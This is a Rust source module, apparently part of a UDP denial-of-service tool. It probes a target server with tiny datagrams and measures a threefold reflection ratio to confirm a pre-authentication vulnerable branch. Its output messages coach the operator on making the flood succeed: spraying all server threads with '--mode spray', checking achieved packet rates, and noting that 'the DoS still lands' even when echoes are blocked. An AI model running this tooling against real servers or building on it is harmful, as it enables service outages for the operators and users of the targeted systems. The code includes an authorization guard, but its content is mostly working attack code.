//! diag: reachability + vulnerable-branch detector.
//!
//! The vulnerable branch reflects every `<= 4` byte datagram back to its source
//! **3 times**, pre-authentication and unconditionally (advisory §3.1). So a low
//! rate of short probes, with the reflections counted, is a definitive test:
//!
//!   * reflection ratio ~= 3.0  -> packets egress, reach :PORT, AND the branch is
//!     present (vulnerability CONFIRMED and reachable from here).
//!   * ratio ~= 0               -> nothing comes back: either egress/ingress
//!     filtering drops the tiny UDP, or the branch is patched/absent.
//!   * ratio ~= 1               -> a single echo/relay, not the 3x short-packet
//!     branch (inconclusive — likely not the vulnerable path).
//!
//! This isolates "is the packet getting there / is the bug even here" from the
//! scaling question (how many pps / which mode), which is what makes a flood that
//! "does nothing" hard to reason about.

use crate::cli::{DiagArgs, GlobalGuards};
use crate::guard;
use crate::pacer::RatePacer;
use std::io;
use std::net::UdpSocket;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

pub fn run(args: DiagArgs, guards: &GlobalGuards) -> io::Result<()> {
    if !(1..=4).contains(&args.payload_len) {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            format!("diag payload_len must be in 1..=4 (got {})", args.payload_len),
        ));
    }
    // Low-rate, short-duration; still gated by the authorization flag.
    guard::authorize(guards, args.pps, (args.count / args.pps.max(1)) + 5)
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?;

    eprintln!(
        "[diag] target={} count={} payload_len={} pps={} linger={}ms",
        args.target, args.count, args.payload_len, args.pps, args.linger_ms
    );

    let sock = UdpSocket::bind("0.0.0.0:0")?;
    sock.set_read_timeout(Some(Duration::from_millis(100)))?;
    let rx_sock = sock.try_clone()?;
    let local = sock.local_addr()?;
    eprintln!("[diag] sending from {local} (fixed source -> one reuseport bucket)");

    let recv_pkts = Arc::new(AtomicU64::new(0));
    let recv_bytes = Arc::new(AtomicU64::new(0));
    let first_rtt_us = Arc::new(AtomicU64::new(0));
    let done = Arc::new(AtomicBool::new(false));
    let origin = Instant::now();

    let rx = {
        let recv_pkts = Arc::clone(&recv_pkts);
        let recv_bytes = Arc::clone(&recv_bytes);
        let first_rtt_us = Arc::clone(&first_rtt_us);
        let done = Arc::clone(&done);
        std::thread::spawn(move || {
            let mut buf = [0u8; 2048];
            while !done.load(Ordering::Relaxed) {
                match rx_sock.recv_from(&mut buf) {
                    Ok((n, _)) => {
                        if recv_pkts.fetch_add(1, Ordering::Relaxed) == 0 {
                            first_rtt_us.store(origin.elapsed().as_micros() as u64, Ordering::Relaxed);
                        }
                        recv_bytes.fetch_add(n as u64, Ordering::Relaxed);
                    }
                    Err(ref e)
                        if e.kind() == io::ErrorKind::WouldBlock || e.kind() == io::ErrorKind::TimedOut => {}
                    // On Windows a prior ICMP port-unreachable surfaces as ConnectionReset here.
                    Err(ref e) if e.kind() == io::ErrorKind::ConnectionReset => {}
                    Err(_) => break,
                }
            }
        })
    };

    let payload = vec![0xABu8; args.payload_len];
    let mut pacer = RatePacer::new(args.pps);
    let mut sent = 0u64;
    let mut send_errs = 0u64;
    let send_origin = Instant::now();
    while sent < args.count {
        pacer.wait_for_next_slot();
        match sock.send_to(&payload, args.target) {
            Ok(_) => sent += 1,
            Err(ref e) if e.kind() == io::ErrorKind::ConnectionReset => send_errs += 1,
            Err(e) => return Err(e),
        }
    }
    let send_secs = send_origin.elapsed().as_secs_f64();

    std::thread::sleep(Duration::from_millis(args.linger_ms));
    done.store(true, Ordering::SeqCst);
    let _ = rx.join();

    let rp = recv_pkts.load(Ordering::Relaxed);
    let rb = recv_bytes.load(Ordering::Relaxed);
    let ratio = if sent == 0 { 0.0 } else { rp as f64 / sent as f64 };
    let frtt = first_rtt_us.load(Ordering::Relaxed);

    println!();
    println!("sent_packets      : {sent}  (~{:.0} pps achieved)", sent as f64 / send_secs.max(1e-9));
    println!("send_errors       : {send_errs}  (ICMP port-unreachable / reset)");
    println!("recv_packets      : {rp}");
    println!("recv_bytes        : {rb}");
    println!("reflection_ratio  : {ratio:.2}   (recv_packets / sent_packets)");
    if frtt > 0 {
        println!("first_response    : {:.2} ms", frtt as f64 / 1000.0);
    } else {
        println!("first_response    : (none)");
    }
    println!();
    println!("verdict: {}", verdict(ratio, send_errs));
    Ok(())
}

fn verdict(ratio: f64, send_errs: u64) -> &'static str {
    if ratio >= 2.0 {
        "~3x reflection -> packets reach :PORT and the vulnerable branch is PRESENT. \
         If a flood still 'does nothing', the issue is SCALE/placement: use --mode spray \
         to hit all threads, and confirm achieved pps. --mode single only stalls 1 of N threads."
    } else if ratio >= 0.5 {
        "~1x response -> a single echo/relay, not the 3x short-packet branch. \
         Likely not the vulnerable path (or a different length condition). Try payload-len 1,2,4."
    } else if send_errs > 0 {
        "no reflection + ICMP unreachable -> the UDP port is closed/unreachable from here \
         (wrong host/port, or the service is not listening)."
    } else {
        "no reflection -> the RETURN packets are being dropped. On Windows this is very often the \
         LOCAL host firewall (Windows Defender) or corporate policy eating the inbound UDP, NOT the \
         server. NOTE: the DoS still lands regardless of whether echoes come back — the server thread \
         sleeps either way. Re-run diag from a Linux host to measure reliably; confirm the path with \
         tcpdump on the server. Only if the server-side capture shows nothing arriving is the branch \
         truly unreachable/patched."
    }
}
